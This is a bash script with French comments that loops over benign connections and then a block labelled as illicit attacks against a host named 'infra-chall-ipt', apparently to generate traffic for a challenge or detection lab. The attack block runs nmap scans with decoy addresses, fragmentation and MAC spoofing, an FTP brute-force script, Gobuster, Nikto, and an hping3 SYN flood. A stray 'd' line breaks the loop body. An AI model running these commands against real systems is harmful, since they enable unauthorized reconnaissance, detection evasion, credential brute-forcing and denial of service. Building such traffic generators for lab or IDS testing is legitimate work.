#!/bin/bash

# Variables
TARGET="infra-chall-ipt" 

# Liste des 10 adresses IP pour le balayage furtif
IP_LIST=("10.0.0.1" "192.168.4.1" "172.156.2.26" "192.168.1.0" "10.10.1.101" "89.89.56.2" "28.12.15.20" "10.172.11.2" "194.25.56.2" "172.5.2.8")

# Récupérer l'IP de la machine qui lance le script
MY_IP=$(hostname -I | awk '{print $1}')
echo "IP de la machine : $MY_IP"

# Générer des adresses pour le plan d'adressage (basé sur l'IP de la machine)
PLAN_ADDRESSES=()
for i in {1..10}; do
    PLAN_ADDRESSES+=("$(echo $MY_IP | cut -d '.' -f 1-3).$i")
done
echo "Adresses du plan d'adressage générées : ${PLAN_ADDRESSES[*]}"

# Récupérer une adresse MAC aléatoire via un scan ARP
echo "Scan ARP pour récupérer une adresse MAC aléatoire..."
MAC_ADDRESS=$(arp -a | awk '{print $4}' | grep -v "incomplete" | shuf -n 1)
echo "Adresse MAC aléatoire : $MAC_ADDRESS"

while true; do
	echo "==== DEBUT DES CONNEXIONS LICITES ===="

	# Connexion HTTP
    echo "Connexion HTTP..."
    curl -I "http://$TARGET"

    # Connexion FTP
    echo "Connexion FTP..."
    ftp -inv "$TARGET" <<EOF
user anonymous anonymous
bye
EOF

    # Connexion SSH
    echo "Connexion SSH..."
    ssh -o BatchMode=yes -o ConnectTimeout=5 "$TARGET" exit

    # Connexion Telnet
    echo "Connexion Telnet..."
    (echo open "$TARGET"; sleep 1; echo quit) | telnet

    echo "Boucle terminée, recommence..."
d
    echo "=== Début des connexions illicites ==="

    # 1. Balayage des ports TCP (1 à 65535)
    echo "1. Balayage des ports TCP (1 à 65535)..."
    timeout 30s nmap -p- -T5 -sV -Pn "$TARGET"

    # 2. Balayage furtif avec les 10 adresses spécifiques
    echo "2. Balayage furtif avec les 10 adresses spécifiques..."
    timeout 30s nmap -p- -T5 -sV -Pn -D "${IP_LIST[0]},${IP_LIST[1]},${IP_LIST[2]},${IP_LIST[3]},${IP_LIST[4]},${IP_LIST[5]},${IP_LIST[6]},${IP_LIST[7]},${IP_LIST[8]},${IP_LIST[9]}" "$TARGET"

    # 3. Balayage furtif avec 10 adresses aléatoires
    echo "3. Balayage furtif avec 10 adresses aléatoires..."
    timeout 30s nmap -p- -T5 -sV -Pn -D RND:10 "$TARGET"

    # 4. Balayage simple fragmenté et en ACK
    echo "4. Balayage simple fragmenté et en ACK..."
    timeout 30s nmap -p- -T5 -sV -Pn -f -sA "$TARGET"

    # 6. Balayage furtif avec les adresses du plan d’adressage générées
    echo "6. Balayage furtif avec les adresses du plan d’adressage..."
    timeout 30s nmap -p- -T5 -sV -Pn -D "${PLAN_ADDRESSES[0]},${PLAN_ADDRESSES[1]},${PLAN_ADDRESSES[2]},${PLAN_ADDRESSES[3]},${PLAN_ADDRESSES[4]},${PLAN_ADDRESSES[5]},${PLAN_ADDRESSES[6]},${PLAN_ADDRESSES[7]},${PLAN_ADDRESSES[8]},${PLAN_ADDRESSES[9]}" "$TARGET"

    # 8. Balayage avec un spoof-mac d’une adresse active
    echo "8. Balayage avec un spoof-mac d’une adresse active..."
    timeout 30s nmap -p- -T5 -sV -Pn --spoof-mac "$MAC_ADDRESS" "$TARGET"

    # 9. Attaque par brute force sur le service FTP
    echo "9. Attaque par brute force sur le service FTP..."
    timeout 30s nmap -p 21 -T5 --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt "$TARGET"

    # 10. Recherche de répertoires avec Gobuster
    echo "10. Recherche de répertoires avec Gobuster..."
    timeout 30s gobuster dir -u "http://$TARGET" -w /directory-list-2.3-medium.txt

    # 11. Attaque web via Nikto
    echo "11. Attaque web via Nikto..."
    timeout 30s nikto -h "http://$TARGET"

    # 12. Balayage des 100 ports les plus utilisés avec un délai d'une seconde
    echo "12. Balayage des 100 ports les plus utilisés..."
    timeout 30s nmap --top-ports 100 -T5 -sV -Pn --max-rate 1 "$TARGET"

    # 13. Test de scripts Nmap orientés « http », « ftp » et « ssh »
    echo "13. Test de scripts Nmap orientés http..."
    timeout 30s nmap -p 80 -T5 -sV -Pn --script http-* "$TARGET"

    echo "13. Test de scripts Nmap orientés ftp..."
    timeout 30s nmap -p 21 -T5 -sV -Pn --script ftp-* "$TARGET"

    echo "13. Test de scripts Nmap orientés ssh..."
    timeout 30s nmap -p 22 -T5 -sV -Pn ssh-* "$TARGET"

    # 14. Relâcher un DDOS via un SYN Flood (avec hping3)
    echo "14. Relâcher un DDOS via un SYN Flood..."
    timeout 30s hping3 --faster -S -p 80 --flood "$TARGET"

	echo "==== DEBUT DES CONNEXIONS LICITES ===="

	# Connexion HTTP
    echo "Connexion HTTP..."
    curl -I "http://$TARGET"

    # Connexion FTP
    echo "Connexion FTP..."
    ftp -inv "$TARGET" <<EOF
user anonymous anonymous
bye
EOF

    # Connexion SSH
    echo "Connexion SSH..."
    ssh -o BatchMode=yes -o ConnectTimeout=5 "$TARGET" exit

    # Connexion Telnet
    echo "Connexion Telnet..."
    (echo open "$TARGET"; sleep 1; echo quit) | telnet

    echo "Boucle terminée, recommence..."
done
